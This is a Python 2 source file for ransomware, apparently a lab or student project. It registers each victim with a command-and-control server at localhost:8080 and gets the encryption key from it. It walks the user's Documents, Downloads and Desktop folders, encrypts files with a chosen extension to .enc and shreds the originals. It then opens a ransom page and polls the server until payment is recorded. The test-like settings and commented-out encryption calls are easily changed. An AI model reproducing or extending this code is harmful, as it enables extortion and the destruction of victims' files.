# coding=utf-8

import requests, json, uuid, os
import re
import webbrowser
from ransomcrypto import *


#
#Definition des variables
#
#

excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
included_filetypes = ['.zozo']
IP_ADDRESS = "http://localhost:8080"

priority_dirs = ['Documents', 'Downloads', 'Desktop'] # would normally do all folders in users home dir


UUID = uuid.uuid4()
#host_name = os.environ['COMPUTERNAME'] Not compatible with Linux
host_name = "BIg"
encryption_key = ""
paid = 0

#
# Définition des méthodes
#
#
def request_server(request,ip_address,uuid,host):

    urls = {'register': '/index/register/', 'paid' : '/index/paid/'}

    url = ip_address + urls[request]
    payload = {'uuid': str(uuid), 'host': str(host)}
    headers = {'content-type': 'application/json'}

    r = requests.post(url, data=json.dumps(payload), headers=headers)

    # Check if request body exists
    if r.status_code == 200:  # r.status_code == 200:

        try:
            content = json.loads(r.content)

            if request == "paid" :
                if content["paid"] == 1 :
                    global paid
                    paid = 1
                    process_encryption(content["encryption_key"])
            else :
                process_encryption(content["encryption_key"])


        except ValueError:
            print ("Bad value")
    else:
        pass

def process_encryption(key):
    global encryption_key
    encryption_key = re.sub('[:]', '', key)
    encryption_key = encryption_key.decode("hex")


def browse_files_and_process(encryption):
    # When encryption key okay
    for target in priority_dirs:
        for dirName, subdirList, fileList in os.walk(os.path.expanduser("~/" + target), topdown=False):
            print dirName

            for file_name in fileList:
                file_name_loc = os.path.join(dirName, file_name)

                name, ext = os.path.splitext(file_name_loc)
                #only_filename = file_name_loc.split(".")[-1]


                if ext in included_filetypes:
                    print file_name_loc

                    # create new encrypted file with .enc extension
                    if(encryption) :

                        try:
                            with open(file_name_loc, 'rb+') as in_file, open(file_name_loc + ".enc", 'wb+') as out_file:
                                encrypt(in_file, out_file, encryption_key)
                        except:
                            continue
                    else :
                        try:
                            with open(file_name_loc, 'rb+') as in_file, open(name, 'wb+') as out_file:
                                decrypt(in_file, out_file, encryption_key)
                        except:
                            continue

                    # shred the orginial file

                    shred(file_name_loc, 2)

                    # onto the next


# register with C&C server
while encryption_key == "":
    request_server("register",IP_ADDRESS,UUID,host_name)
    print encryption_key



#browse_files_and_process(True)
del encryption_key

url = IP_ADDRESS + "/index/"
webbrowser.open(url,new=2)


while paid == 0 :
    request_server("paid",IP_ADDRESS,UUID,host_name)

print "OKAY"
#browse_files_and_process(False)